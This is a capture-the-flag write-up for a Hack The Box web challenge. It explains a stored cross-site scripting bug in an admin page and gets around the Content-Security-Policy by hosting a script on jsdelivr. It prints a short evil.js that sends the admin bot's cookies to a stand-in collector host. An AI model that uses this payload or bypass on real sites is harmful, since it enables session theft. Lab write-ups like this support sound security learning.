# Cursed Secret Party
## Steps

1. Send a normal req.

![image](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/ebb42324-1081-4f25-aeae-77bf62dd1cfe)


2. Check source, how it works ?? :
there is a route `/api/submit`, it gets our data to check and add into database, and then a `BOT` will visit `/admin` to colect our data and then renders them in `admin.html` but in `admin.html` has a problem

```
    <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
```
- We see that the `halloween_name` marked it as `safe`, it means the Cross-Site script atk (i have no ideal about it @@@)
Now, let's see how the bot works.

![image](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/86863d2a-cd09-4a33-96af-f1c0f7fc1fed)


- The bot create a JWT token with flag and roles to be authenticated as an admin and then deletes all by goto(`.../admin/delete_all...`)

**Ideal**: we'll steal the cookie of bot.

- And final note is `Content-Security-Policy` header in `index.js`

```
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
    next();
});

```
- It means there's no injected JS files can execute in because there's no `inline` parameter in the `script-src` directive.

**Ideal** : create a public Gitbub repository and host our JS file on `https://cdn.jsdelivr.net`

- The format should be as follows:

`https://cdn.jsdelivr.net/gh/<github_username>/<repository_name>/<file_name>.js`

- For example: 

`https://cdn.jsdelivr.net/gh/0jamaKig86/code.py/evil.js`

- evil.js
```
var xhttp = new XMLHttpRequest();
xhttp.open('GET', 'http://BURP-CLIENT-ID/?' + document.cookie, true);
xhttp.send();
```
3. Final payload.

![image](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/724ed2e2-50a7-43c1-85c0-10be88688802)


- Check burp-client.

![image](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/160dd754-7db8-4891-8d34-a2db1ecad34b)


- Decode session.

![image](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/d674d5a3-5fdb-49e5-9de4-bb111653d608)

